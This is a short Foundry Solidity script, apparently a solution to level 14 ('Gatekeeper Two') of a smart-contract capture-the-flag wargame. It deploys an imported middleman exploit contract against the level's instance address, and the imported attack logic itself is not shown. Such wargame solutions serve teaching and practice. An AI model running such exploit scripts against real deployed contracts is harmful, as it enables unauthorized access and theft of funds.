// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

import {GatekeeperTwoMiddleman} from "../src/Level14.sol";

// ================================================================
// │                    LEVEL 14 - GATEKEEPER TWO                 │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        vm.startBroadcast();
        new GatekeeperTwoMiddleman(targetContractAddress);
        vm.stopBroadcast();
    }
}
